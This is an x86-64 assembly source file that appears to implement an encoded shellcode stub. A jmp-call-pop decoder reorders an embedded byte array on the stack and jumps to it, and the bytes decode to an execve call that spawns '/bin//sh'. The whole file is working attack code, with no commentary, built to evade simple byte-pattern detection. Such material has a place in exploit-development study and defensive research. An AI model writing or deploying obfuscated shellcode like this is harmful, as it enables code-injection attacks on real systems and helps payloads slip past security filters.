global _start


_start:
	jmp find_address

decoder:
	pop rdi
	xor ecx, ecx
	add cl, 16 
decode:
	xor eax, eax
	push rax
	mov ax, [rdi]
	mov word [rsp+6],ax
	add rsp, 6 
	add dil, 2 
	loop decode
	jmp rsp

find_address:
	call decoder

encoded_shellcode: db 0x0f,0x05,0xc0,0x3b,0x48,0x83,0x89,0xe6,0x57,0x48,0x89,0xe2,0x50,0x48,0x89,0xe7,0x53,0x48,0x73,0x68,0x2f,0x2f,0x69,0x6e,0x2f,0x62,0x48,0xbb,0xc0,0x50,0x48,0x31 
